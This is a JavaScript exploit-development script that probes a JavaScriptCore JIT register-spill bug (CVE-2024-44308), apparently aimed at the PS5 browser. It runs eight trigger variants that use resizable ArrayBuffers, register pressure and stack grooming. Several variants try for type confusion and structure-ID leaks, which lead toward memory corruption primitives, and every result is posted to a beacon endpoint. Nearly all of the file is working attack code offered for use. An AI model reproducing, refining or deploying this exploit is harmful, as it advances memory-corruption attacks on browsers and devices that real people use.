/* p107 — CVE-2024-44308 DFG register spill with RESIZABLE ArrayBuffer
 *
 * THE BUG: In compilePutByValForIntTypedArray, scratch2 register allocated
 * AFTER slow-path branch. When slow path taken, register contents never
 * spilled. Slow-path call clobbers register. JIT reads stale stack slot.
 *
 * KEY INSIGHT: Our p100-p101 tests used REGULAR ArrayBuffers.
 * The bug ONLY fires on mayBeResizableOrGrowableSharedTypedArray path.
 * PS5 has no SharedArrayBuffer but HAS ResizableArrayBuffer.
 *
 * TRIGGER:
 * 1. ArrayBuffer(4, {maxByteLength:8}) — resizable → vulnerable code path
 * 2. Int32Array backed by resizable buffer
 * 3. Warmup: store (i + 1337.1337) 100K times → DFG compiles PutByVal
 * 4. Trigger: store 13371337133713371337.1337 → can't truncate to int32
 *    → slow path → register corruption
 * 5. Register pressure via repeated array reads in same function
 * 6. Stack grooming via paired priming/exploit functions
 *
 * Beacon prefix: V107K-
 */
(function(){
var RUN_ID = "v107k" + Math.random().toString(36).slice(2,12);
var PREFIX = "V107K-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press107-regspill");

var _f64 = new Float64Array(1);
var _u32 = new Uint32Array(_f64.buffer);
function f2i(f) { _f64[0] = f; return [_u32[0], _u32[1]]; }
function i2f(lo, hi) { _u32[0] = lo; _u32[1] = hi; return _f64[0]; }

/* ====== K1: Basic trigger — does resizable AB + slow path crash or corrupt? ====== */
function test_K1() {
  var r = {};
  try {
    r.hasResizable = typeof ArrayBuffer.prototype.resize === 'function';
    if (!r.hasResizable) {
      r.SKIP = true;
      B("K1-BASIC", r);
      return;
    }

    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    r.rabOk = true;
    r.rabResizable = rab.resizable;
    r.rabByteLength = rab.byteLength;
    r.rabMaxByteLength = rab.maxByteLength;

    var intArr = new Int32Array(rab);
    r.intArrLen = intArr.length;

    function opt(thing) {
      intArr[0] = thing;
    }

    for (var i = 0; i < 100000; i++) {
      opt(i + 1337.1337);
    }
    r.warmupDone = true;
    r.afterWarmup = intArr[0];

    opt(13371337133713371337.1337);
    r.afterTrigger = intArr[0];

    r.SURVIVED = true;
    B("K1-BASIC", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("K1-ERR", r); }
}

/* ====== K2: Register pressure + slow path — adapted from migopp PoC ====== */
function test_K2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var intArr = new Int32Array(rab);
    var f64 = new Float64Array(2);
    var u32 = new Uint32Array(f64.buffer);
    var floatArr = [1337.1337, 0];

    var container = {a: 1337.1337, b: 1337.1337, c: 1337.1337, d: 1337.1337};

    function opt1(ary, ary1, woot) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {};
      c = {};
      d = {a: ary1};
      e = {};
      f = {};
      g = {};
      h = {};
      intArr[0] = ary;
      floatArr[0];
      String(d.a);
      b = f64[0] = floatArr[1];
      u32[0] += 0x18;
      floatArr[1] = f64[0];
      e.a = a;
      f.a = a;
      g.a = a;
      h.a = a;
      return d.a;
    }

    function opt(ary, ary1, woot) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {};
      c = {};
      d = {a: ary1};
      e = {};
      f = {};
      g = {};
      h = {};
      intArr[0] = ary;
      floatArr[0];
      String(d.a);
      b = f64[0] = floatArr[1];
      u32[0] += 0x18;
      floatArr[1] = f64[0];
      e.a = a;
      f.a = a;
      g.a = a;
      h.a = a;
      return d.a;
    }

    function stack_set_and_call(val, val1) {
      var a;
      try { throw 0; } catch(_e) { a = _e; }
      var x = opt1(1337.1337, val);
      var y = opt(13371337133713371337.1337, val1);
      return y;
    }

    var vals = [];
    for (var i = 0; i < 32; i++) {
      vals.push({toString: function() { floatArr[1] = container; return "x"; }});
    }

    for (var i = 0; i < 10000; i++) {
      opt1(i + 1337.1337, i);
    }
    r.opt1Compiled = true;

    for (var i = 0; i < 10000; i++) {
      opt(i + 1337.1337, i);
    }
    r.optCompiled = true;

    for (var i = 0; i < 10000; i++) {
      stack_set_and_call(i, i);
    }
    r.wrapperCompiled = true;

    var oj = {_a: 0, b: 0, c: 0, d: 0, a: 378 * Number.MIN_VALUE};
    var oj1 = {a: 0, b: 0, c: 0, d: 0};

    var result = stack_set_and_call(oj1, oj);
    r.resultType = typeof result;
    r.resultVal = String(result).slice(0, 60);

    if (typeof result === 'number') {
      r.CONFUSION = true;
      var bits = f2i(result);
      r.lo = '0x' + (bits[0] >>> 0).toString(16);
      r.hi = '0x' + (bits[1] >>> 0).toString(16);
    } else if (typeof result === 'object' && result !== null) {
      r.isObj = true;
      try { r.objKeys = Object.keys(result).join(','); } catch(e2) {}
    } else {
      r.rawResult = String(result).slice(0, 40);
    }

    r.SURVIVED = true;
    B("K2-REGPRESSURE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("K2-ERR", r); }
}

/* ====== K3: Simpler variant — just test if slow path corrupts observable state ====== */
function test_K3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var intArr = new Int32Array(rab);

    var sentinel = {magic: 0xDEAD};
    var witness = {val: sentinel};

    function opt3(thing) {
      var w = witness.val;
      intArr[0] = thing;
      var w2 = witness.val;
      return w === w2;
    }

    for (var i = 0; i < 100000; i++) {
      opt3(i + 1337.1337);
    }
    r.warmupDone = true;

    var same = opt3(13371337133713371337.1337);
    r.sameRef = same;
    r.witnessType = typeof witness.val;
    r.witnessOk = witness.val === sentinel;

    if (!same) {
      r.CORRUPTION = true;
      B("K3-CORRUPT", r);
    }

    r.SURVIVED = true;
    B("K3-WITNESS", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("K3-ERR", r); }
}

/* ====== K4: Different int typed array types ====== */
function test_K4() {
  var r = {};
  try {
    var types = [
      {name: 'Int8', ctor: Int8Array, bytes: 1},
      {name: 'Uint8', ctor: Uint8Array, bytes: 1},
      {name: 'Int16', ctor: Int16Array, bytes: 2},
      {name: 'Uint16', ctor: Uint16Array, bytes: 2},
      {name: 'Int32', ctor: Int32Array, bytes: 4},
      {name: 'Uint32', ctor: Uint32Array, bytes: 4}
    ];

    var results = [];

    for (var t = 0; t < types.length; t++) {
      var info = types[t];
      try {
        var rab = new ArrayBuffer(info.bytes, {maxByteLength: info.bytes * 2});
        var arr = new info.ctor(rab);

        var fn = new Function('arr', 'thing',
          'var l = [1,2];' +
          'l[0];l[1];l[0];l[1];l[0];l[1];l[0];l[1];' +
          'l[0];l[1];l[0];l[1];l[0];l[1];l[0];l[1];' +
          'l[0];l[1];l[0];l[1];l[0];l[1];l[0];l[1];' +
          'l[0];l[1];' +
          'var b={};var c={};var d={};var e={};var f={};var g={};var h={};' +
          'arr[0] = thing;' +
          'return arr[0];'
        );

        for (var i = 0; i < 100000; i++) {
          fn(arr, i + 1337.1337);
        }

        var before = arr[0];
        fn(arr, 13371337133713371337.1337);
        var after = arr[0];

        results.push(info.name + ':before=' + before + ',after=' + after);
      } catch(e2) {
        results.push(info.name + ':ERR=' + e2.message.slice(0,30));
      }
    }

    r.results = results.join('|');
    r.SURVIVED = true;
    B("K4-TYPES", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("K4-ERR", r); }
}

/* ====== K5: Uint32Array variant (Exodus uses this) ====== */
function test_K5() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var uintArr = new Uint32Array(rab);
    var f64 = new Float64Array(2);
    var u32 = new Uint32Array(f64.buffer);
    var floatArr = [1337.1337, 0];

    var container = {a: 1337.1337, b: 1337.1337, c: 1337.1337, d: 1337.1337};

    function sopt1(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {};
      c = {};
      d = ary1.b;
      e = {};
      f = {};
      g = {};
      h = {};
      uintArr[0] = ary;
      e.a = a;
      f.a = a;
      g.a = a;
      h.a = a;
      return ary1.a;
    }

    function sopt(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {};
      c = {};
      d = ary1.b;
      e = {};
      f = {};
      g = {};
      h = {};
      uintArr[0] = ary;
      e.a = a;
      f.a = a;
      g.a = a;
      h.a = a;
      return ary1.a;
    }

    function leak_attempt(val, val1) {
      try { throw 0; } catch(_e) {}
      var a = sopt1(1337.1337, val);
      var b = sopt(13371337133713371337.1337, val1);
      return b;
    }

    var oj = {_a: 0, b: 0, c: 0, d: 0, a: 378 * Number.MIN_VALUE};
    var oj1 = {a: 0, b: 0, c: 0, d: 0};

    for (var i = 0; i < 10000; i++) {
      sopt1(i + 1337.1337, oj1);
    }
    r.sopt1Done = true;

    for (var i = 0; i < 10000; i++) {
      sopt(i + 1337.1337, oj);
    }
    r.soptDone = true;

    for (var i = 0; i < 10000; i++) {
      leak_attempt(oj1, oj);
    }
    r.wrapDone = true;

    var result = leak_attempt(oj1, oj);
    r.resultType = typeof result;

    if (typeof result === 'number') {
      r.LEAK = true;
      r.val = result;
      var bits = f2i(result);
      r.lo = '0x' + (bits[0] >>> 0).toString(16);
      r.hi = '0x' + (bits[1] >>> 0).toString(16);
      B("K5-LEAK", r);
    } else {
      r.rawResult = String(result).slice(0, 60);
    }

    r.SURVIVED = true;
    B("K5-UINT32", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("K5-ERR", r); }
}

/* ====== K6: Max register pressure — more variables, more object allocs ====== */
function test_K6() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var intArr = new Int32Array(rab);

    function pressure_opt(thing) {
      var a, b, c, d, e, f, g, h, i, j, k, m, n, o, p;
      var l = [1, 2, 3, 4, 5, 6, 7, 8];
      l[0]; l[1]; l[2]; l[3]; l[4]; l[5]; l[6]; l[7];
      l[0]; l[1]; l[2]; l[3]; l[4]; l[5]; l[6]; l[7];
      l[0]; l[1]; l[2]; l[3]; l[4]; l[5]; l[6]; l[7];
      l[0]; l[1]; l[2]; l[3]; l[4]; l[5]; l[6]; l[7];
      a = {};
      b = {};
      c = {};
      d = {};
      e = {};
      f = {};
      g = {};
      h = {};
      i = {};
      j = {};
      k = {};
      m = {};
      n = {};
      o = {};
      p = {};

      intArr[0] = thing;

      var r1 = a; var r2 = b; var r3 = c; var r4 = d;
      var r5 = e; var r6 = f; var r7 = g; var r8 = h;
      return [r1, r2, r3, r4, r5, r6, r7, r8, i, j, k, m, n, o, p];
    }

    for (var i = 0; i < 100000; i++) {
      pressure_opt(i + 1337.1337);
    }
    r.warmupDone = true;

    var result = pressure_opt(13371337133713371337.1337);
    r.resultLen = result.length;

    var anomalies = [];
    for (var i = 0; i < result.length; i++) {
      var v = result[i];
      if (typeof v !== 'object' || v === null) {
        anomalies.push(i + ':' + typeof v + '=' + String(v).slice(0,20));
      }
    }

    if (anomalies.length > 0) {
      r.CORRUPTION = true;
      r.anomalies = anomalies.join('|');
      B("K6-CORRUPT", r);
    } else {
      r.allObjects = true;
    }

    r.afterVal = intArr[0];
    r.SURVIVED = true;
    B("K6-PRESSURE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("K6-ERR", r); }
}

/* ====== K7: Direct PoC adaptation — structure ID leak ====== */
function test_K7() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var intArr = new Int32Array(rab);
    var f64 = new Float64Array(2);
    var u32 = new Uint32Array(f64.buffer);

    function sopt1_k7(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {};
      c = {};
      d = ary1.b;
      e = {};
      f = {};
      g = {};
      h = {};
      intArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    function sopt_k7(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {};
      c = {};
      d = ary1.b;
      e = {};
      f = {};
      g = {};
      h = {};
      intArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    var oj = {_a: 0, b: 0, c: 0, d: 0, a: 378 * Number.MIN_VALUE};
    var oj1 = {a: 0, b: 0, c: 0, d: 0};

    for (var i = 0; i < 15000; i++) sopt1_k7(i + 1337.1337, oj1);
    for (var i = 0; i < 15000; i++) sopt_k7(i + 1337.1337, oj);
    r.compileDone = true;

    function leak_k7(val, val1) {
      try { throw 0; } catch(_) {}
      sopt1_k7(1337.1337, val);
      return sopt_k7(13371337133713371337.1337, val1);
    }

    for (var i = 0; i < 5000; i++) leak_k7(oj1, oj);
    r.wrapCompiled = true;

    var results = [];
    for (var attempt = 0; attempt < 20; attempt++) {
      var victim = {a: 1, b: 0, c: 0, d: 0};
      victim.a = oj1;
      var val = leak_k7(oj1, oj);
      var vtype = typeof val;
      if (vtype === 'number') {
        f64[0] = val;
        var structId = u32[0];
        results.push('A' + attempt + ':NUM:0x' + structId.toString(16));
        r.GOT_NUMBER = true;
      } else {
        results.push('A' + attempt + ':' + vtype);
      }
    }

    r.results = results.join('|');
    if (r.GOT_NUMBER) B("K7-STRUCTLEAK", r);
    r.SURVIVED = true;
    B("K7-IDLEAK", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("K7-ERR", r); }
}

/* ====== K8: Vary warmup counts — DFG may need different thresholds ====== */
function test_K8() {
  var r = {};
  try {
    var warmups = [1000, 5000, 10000, 50000, 100000, 200000];
    var results = [];

    for (var w = 0; w < warmups.length; w++) {
      var count = warmups[w];
      var rab = new ArrayBuffer(4, {maxByteLength: 8});
      var intArr = new Int32Array(rab);

      var fn = new Function('intArr', 'thing',
        'var l=[1,2];' +
        'l[0];l[1];l[0];l[1];l[0];l[1];l[0];l[1];' +
        'l[0];l[1];l[0];l[1];l[0];l[1];l[0];l[1];' +
        'l[0];l[1];l[0];l[1];l[0];l[1];l[0];l[1];l[0];l[1];' +
        'var b={};var c={};var d={};var e={};var f={};var g={};var h={};' +
        'intArr[0]=thing;' +
        'b.x=0;c.x=0;d.x=0;e.x=0;f.x=0;g.x=0;h.x=0;' +
        'return intArr[0];'
      );

      for (var i = 0; i < count; i++) fn(intArr, i + 1337.1337);
      var before = intArr[0];

      fn(intArr, 13371337133713371337.1337);
      var after = intArr[0];

      var returned = fn(intArr, 13371337133713371337.1337);

      results.push(count + ':b=' + before + ',a=' + after + ',r=' + returned);
    }

    r.results = results.join('|');
    r.SURVIVED = true;
    B("K8-WARMUPS", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("K8-ERR", r); }
}

/* ====== Run ====== */
try {
  test_K1();
  setTimeout(test_K2, 2000);
  setTimeout(test_K3, 8000);
  setTimeout(test_K4, 12000);
  setTimeout(test_K5, 18000);
  setTimeout(test_K6, 28000);
  setTimeout(test_K7, 38000);
  setTimeout(test_K8, 50000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe107-done"); }, 90000);
})();
